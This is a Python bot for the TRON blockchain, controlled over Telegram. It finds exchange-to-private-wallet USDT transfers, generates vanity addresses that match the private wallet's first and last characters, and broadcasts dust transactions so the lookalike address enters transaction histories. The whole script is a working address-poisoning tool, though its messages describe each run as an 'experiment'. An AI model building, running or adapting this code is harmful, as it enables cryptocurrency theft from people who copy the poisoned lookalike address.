import os
import time
import json
import requests
from datetime import datetime, timedelta, timezone
from tronpy import Tron
from tronpy.keys import PrivateKey

# =========================
# 🟢 USER SETTINGS (BROAD TEST RULES)
# =========================
TARGET_PAIRS = 5             # How many pairs to find before pausing for commands
MIN_BALANCE_USD = 0          # 🟢 BROAD: Accept ANY balance for testing
MIN_TRANSFER_USD = 1         #  BROAD: Accept transfers as low as $1
REQUIRED_CONSECUTIVE = 2     # Looking for 2 consecutive sends
WINDOW_DAYS = 30             # 🟢 BROAD: Look back 30 days
GAS_COST_PER_PAIR_TRX = 2.2  # Estimated gas cost per pair

# Known CEX Keywords
CEX_KEYWORDS = ['binance', 'okx', 'huobi', 'htx', 'gate', 'kucoin', 'bybit', 'mexc', 'bitfinex', 'coinbase', 'kraken', 'bitget', 'poloniex', 'crypto.com', 'exchange']

# =========================
# 1. LOAD SECRETS & INITIALIZE
# =========================
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
CHAT_ID = os.environ.get("CHAT_ID")
TRONGRID_API_KEY = os.environ.get("TRONGRID_API_KEY")
TRONSCAN_API_KEY = os.environ.get("TRONSCAN_API_KEY")
PRIVATE_KEY = os.environ.get("PRIVATE_KEY")

if not all([TELEGRAM_BOT_TOKEN, CHAT_ID, TRONGRID_API_KEY, TRONSCAN_API_KEY, PRIVATE_KEY]):
    raise Exception("Missing GitHub Secrets!")

tron = Tron()
main_wallet = PrivateKey(bytes.fromhex(PRIVATE_KEY.replace('0x', ''))).public_key.to_base58check_address()
TELEGRAM_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"

# Transaction logs storage
transaction_logs = []

# =========================
# 2. TELEGRAM & API HELPERS
# =========================
def send_telegram_alert(message, parse_mode="HTML"):
    url = f"{TELEGRAM_URL}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": message, "parse_mode": parse_mode, "disable_web_page_preview": True}
    try:
        requests.post(url, json=data, timeout=10)
    except Exception as e:
        print(f"Telegram error: {e}")

def get_telegram_updates(offset):
    url = f"{TELEGRAM_URL}/getUpdates"
    params = {"offset": offset, "timeout": 30}
    try:
        response = requests.get(url, params=params, timeout=35)
        return response.json().get("result", [])
    except:
        return []

def check_if_cex(address):
    """Checks if an address is a CEX."""
    try:
        headers = {"TRON-PRO-API-KEY": TRONSCAN_API_KEY}
        response = requests.get(f"https://apilist.tronscanapi.com/api/account", params={"address": address}, headers=headers, timeout=10)
        data = response.json()
        tags = data.get("tags", [])
        name = data.get("accountName", "") or data.get("name", "")
        combined_text = " ".join(tags + [name]).lower()
        
        for keyword in CEX_KEYWORDS:
            if keyword in combined_text: return True, keyword.capitalize()
        if data.get("is_exchange") or "exchange" in combined_text:
            return True, "Exchange"
        return False, None
    except: return False, None

def trongrid_get(path, params=None):
    headers = {"TRON-PRO-API-KEY": TRONGRID_API_KEY}
    try:
        response = requests.get(f"https://api.trongrid.io{path}", params=params or {}, headers=headers, timeout=30)
        return response.json()
    except: return None

def get_usdt_balance(address):
    data = trongrid_get(f"/v1/accounts/{address}/trc20/balance", {"contract_address": "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"})
    if not data or not data.get("data"): return 0
    return int(data["data"][0].get("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", "0")) / 1_000_000

def get_trx_balance(address):
    data = trongrid_get(f"/v1/accounts/{address}", {"only_confirmed": "true"})
    if not data or not data.get("data"): return 0
    return int(data["data"][0].get("balance", 0)) / 1_000_000

def get_recent_transfers_batch(limit=200):
    """Fetches a batch of recent USDT transfers."""
    end_ms = int(datetime.now(timezone.utc).timestamp() * 1000)
    start_ms = int((datetime.now(timezone.utc) - timedelta(days=WINDOW_DAYS)).timestamp() * 1000)
    
    headers = {"TRON-PRO-API-KEY": TRONSCAN_API_KEY}
    try:
        response = requests.get(
            "https://apilist.tronscanapi.com/api/token_trc20/transfers",
            params={
                "start": 0, "limit": limit, "sort": "-timestamp",
                "start_timestamp": start_ms, "end_timestamp": end_ms,
                "contract_address": "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
            },
            headers=headers, timeout=30
        )
        return response.json().get("data", [])
    except: return []

# =========================
# 3. VANITY & TRANSFER LOGIC
# =========================
def generate_vanity_wallet(target_address, max_attempts=50000):
    best_addr, best_key, best_score = None, None, 0
    for _ in range(max_attempts):
        key = PrivateKey.random()
        addr = key.public_key.to_base58check_address()
        score = sum(1 for i in range(3) if addr[i] == target_address[i]) + \
                sum(1 for i in range(1, 4) if addr[-i] == target_address[-i])
        if score > best_score:
            best_score = score; best_addr = addr; best_key = key.hex()
            if score >= 6: break
    return best_addr, best_key

def send_zero_value_trx(from_priv_hex, to_address):
    try:
        priv = PrivateKey(bytes.fromhex(from_priv_hex.replace('0x', '')))
        sender = priv.public_key.to_base58check_address()
        txn = tron.trx.transfer(sender, to_address, 1).build().sign(priv) # 1 SUN = $0 value
        result = txn.broadcast()
        return result.txid
    except Exception as e:
        print(f"Transfer error: {e}")
        return None

# =========================
# 4. MAIN INTERACTIVE LOOP
# =========================
def main():
    global transaction_logs
    
    print(f" Starting Smart Scan. Target: {TARGET_PAIRS} pairs.")
    send_telegram_alert(f" <b>Smart Scan Started</b>\nTarget: {TARGET_PAIRS} pairs\nLooking for: <b>CEX (Wallet A) → Private Wallet (Wallet B)</b>\nI will pause when found.")
    
    found_pairs = []
    checked_receivers = set()
    
    # --- PHASE 1: SMART SCANNING ---
    while len(found_pairs) < TARGET_PAIRS:
        print(f"Scanning batch... Found {len(found_pairs)}/{TARGET_PAIRS}")
        
        transfers = get_recent_transfers_batch(limit=200)
        if not transfers:
            time.sleep(2)
            continue
            
        # Group by Receiver (Wallet B)
        receivers_map = {}
        for tx in transfers:
            to_addr = tx.get("to") or tx.get("toAddress")
            from_addr = tx.get("from") or tx.get("fromAddress")
            amount = int(tx.get("quant", 0) or tx.get("amount", 0)) / 1_000_000
            txid = tx.get("hash") or tx.get("transaction_id")
            
            if to_addr not in receivers_map:
                receivers_map[to_addr] = []
            receivers_map[to_addr].append({"from": from_addr, "amount": amount, "txid": txid})

        # Check for patterns
        # Check for patterns - SIMPLIFIED FOR SPEED
        for wallet_b, txs in receivers_map.items():
            if len(found_pairs) >= TARGET_PAIRS: break
            if wallet_b in checked_receivers: continue
            
            # Just check the most recent transaction for this wallet
            if len(txs) < 1: continue
            
            tx1 = txs[0]  # Most recent
            wallet_a = tx1["from"]
            
            # RULE 1: Wallet A MUST be CEX
            is_a_cex, a_cex_name = check_if_cex(wallet_a)
            if not is_a_cex: 
                continue 
            
            # RULE 2: Wallet B MUST NOT be CEX
            is_b_cex, _ = check_if_cex(wallet_b)
            if is_b_cex: 
                continue
                
            # RULE 3: Balance Check (set to 0 so it always passes)
            usdt_bal = get_usdt_balance(wallet_b)
            trx_bal = get_trx_balance(wallet_b)
            if usdt_bal + (trx_bal * 0.25) < MIN_BALANCE_USD: 
                continue
                
            # SUCCESS!
            checked_receivers.add(wallet_b)
            found_pairs.append({
                "wallet_a": wallet_a, "wallet_b": wallet_b, 
                "a_cex_name": a_cex_name,
                "txids": [tx1["txid"]]
            })
            send_telegram_alert(f"✅ <b>Pair {len(found_pairs)}/{TARGET_PAIRS} Found!</b>\n A ({a_cex_name}): <code>{wallet_a}</code>\n👤 B (Private): <code>{wallet_b}</code>")
                        
        if len(found_pairs) < TARGET_PAIRS: 
            time.sleep(1) 

    # --- PHASE 2: INTERACTIVE WAITING ROOM ---
    send_telegram_alert(
        f"🎯 <b>Target Reached! Found {len(found_pairs)} CEX→Private pairs.</b>\n\n"
        f"<b>Available Commands:</b>\n"
        f"• <b>info</b> - Show wallet details & total cost\n"
        f"• <b>exclude [Address]</b> - Remove a wallet\n"
        f"• <b>history [Address]</b> - Check USDT history of a wallet\n"
        f"• <b>logs [date]</b> - View transaction logs\n"
        f"• <b>transfer</b> - Execute $0 vanity transfers"
    )
    
    last_update_id = 0
    execution_triggered = False
    
    print("Entering interactive Telegram polling mode...")
    
    while not execution_triggered:
        updates = get_telegram_updates(last_update_id)
        for update in updates:
            last_update_id = update["update_id"]
            if update.get("message") and str(update["message"].get("chat", {}).get("id")) == str(CHAT_ID):
                text = update["message"].get("text", "").strip()
                
                # COMMAND: INFO
                if text.lower() == "info":
                    total_cost = len(found_pairs) * GAS_COST_PER_PAIR_TRX
                    msg = f" <b>Wallet Information & Cost</b>\n\n"
                    msg += f"Active Pairs: {len(found_pairs)}\n"
                    msg += f"Est. Gas Cost: {GAS_COST_PER_PAIR_TRX} TRX per pair\n"
                    msg += f"<b>Total Required: {total_cost:.2f} TRX</b>\n\n"
                    for i, p in enumerate(found_pairs):
                        msg += f"<b>Pair {i+1}:</b>\n🏦 A ({p['a_cex_name']}): <code>{p['wallet_a']}</code>\n👤 B (Private): <code>{p['wallet_b']}</code>\n\n"
                    send_telegram_alert(msg)
                
                # COMMAND: EXCLUDE
                elif text.lower().startswith("exclude"):
                    parts = text.split()
                    if len(parts) > 1:
                        addr_to_exclude = parts[1]
                        initial_count = len(found_pairs)
                        found_pairs = [p for p in found_pairs if p['wallet_a'] != addr_to_exclude and p['wallet_b'] != addr_to_exclude]
                        removed = initial_count - len(found_pairs)
                        if removed > 0:
                            send_telegram_alert(f"🗑️ Excluded {removed} pair(s) containing <code>{addr_to_exclude}</code>.")
                        else:
                            send_telegram_alert(f"❌ Address <code>{addr_to_exclude}</code> not found.")
                    else:
                        send_telegram_alert("⚠️ Usage: <b>exclude [Address]</b>")

                # COMMAND: HISTORY
                elif text.lower().startswith("history"):
                    parts = text.split()
                    if len(parts) > 1:
                        target_addr = parts[1]
                        headers = {"TRON-PRO-API-KEY": TRONSCAN_API_KEY}
                        try:
                            response = requests.get(
                                "https://apilist.tronscanapi.com/api/token_trc20/transfers",
                                params={"address": target_addr, "limit": 10, "sort": "-timestamp"},
                                headers=headers, timeout=30
                            )
                            data = response.json().get("data", [])
                            
                            if not data:
                                send_telegram_alert(f"📭 No USDT history found for <code>{target_addr}</code>")
                            else:
                                msg = f" <b>USDT History for</b> <code>{target_addr[:20]}...</code>\n\n"
                                for i, tx in enumerate(data[:10]):
                                    from_addr = tx.get("from") or tx.get("fromAddress")
                                    to_addr = tx.get("to") or tx.get("toAddress")
                                    amount = int(tx.get("quant", 0) or tx.get("amount", 0)) / 1_000_000
                                    timestamp = tx.get("timestamp", 0)
                                    date_str = datetime.fromtimestamp(timestamp/1000).strftime("%Y-%m-%d %H:%M")
                                    
                                    direction = "📥 IN" if to_addr.lower() == target_addr.lower() else "📤 OUT"
                                    msg += f"<b>#{i+1}</b> {direction} | {amount:.2f} USDT\n"
                                    msg += f"From: <code>{from_addr[:20]}...</code>\n"
                                    msg += f"Date: {date_str}\n\n"
                                send_telegram_alert(msg)
                        except Exception as e:
                            send_telegram_alert(f" Error fetching history: {e}")
                    else:
                        send_telegram_alert("⚠️ Usage: <b>history [Address]</b>")

                # COMMAND: LOGS
                elif text.lower().startswith("logs"):
                    if not transaction_logs:
                        send_telegram_alert("📭 No transactions completed yet in this session.")
                    else:
                        parts = text.split(" ", 1)
                        filter_date = parts[1].lower() if len(parts) > 1 else None
                        msg = "📜 <b>Transaction Logs</b>\n\n"
                        if filter_date: msg += f"Filtered by date: <i>{filter_date}</i>\n\n"
                        for i, log in enumerate(transaction_logs):
                            log_date = log['timestamp'].split('T')[0]
                            if filter_date and filter_date not in log_date.lower(): continue
                            msg += f"<b>#{i+1}</b> - {log_date}\nVanity: <code>{log['vanity_wallet'][:20]}...</code>\nTX1: <code>{log['tx1'][:20]}...</code>\nTX2: <code>{log['tx2'][:20]}...</code>\n\n"
                        if len(msg) > 4000: msg = msg[:4000] + "\n<i>(truncated)</i>"
                        send_telegram_alert(msg)
                
                # COMMAND: TRANSFER
                elif text.lower() == "transfer":
                    if not found_pairs:
                        send_telegram_alert("❌ No pairs left to process!")
                    else:
                        send_telegram_alert(f"🚀 <b>Trigger Accepted!</b>\nExecuting $0 transfers for {len(found_pairs)} pairs...")
                        execution_triggered = True
                        break
        
        if not execution_triggered:
            time.sleep(5)

    # --- PHASE 3: EXECUTION ---
    print(f"\n🎯 Executing transfers for {len(found_pairs)} pairs...")
    
    for i, pair in enumerate(found_pairs):
        print(f"\n--- Processing Pair {i+1} ---")
        wallet_b = pair["wallet_b"]
        wallet_a = pair["wallet_a"]
        
        vanity_addr, vanity_priv = generate_vanity_wallet(wallet_b)
        print(f"Generated Vanity: {vanity_addr}")
        
        tx1 = send_zero_value_trx(PRIVATE_KEY, vanity_addr)
        time.sleep(3)
        
        tx2 = send_zero_value_trx(vanity_priv, wallet_a)
        
        transaction_logs.append({
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "wallet_a": wallet_a, "wallet_b": wallet_b,
            "vanity_wallet": vanity_addr, "tx1": tx1, "tx2": tx2,
            "cex_name": pair['a_cex_name']
        })
        
        msg = (f"🧪 <b>Experiment {i+1} Complete</b>\n"
               f"🏦 CEX ({pair['a_cex_name']}): <code>{wallet_a}</code>\n"
               f" Vanity: <code>{vanity_addr}</code>\n"
               f"TX1: <code>{tx1}</code>\nTX2: <code>{tx2}</code>")
        send_telegram_alert(msg)
        time.sleep(5)

    send_telegram_alert("🏁 <b>All tasks completed successfully!</b>")
    print("✅ Workflow finished.")

if __name__ == "__main__":
    main()
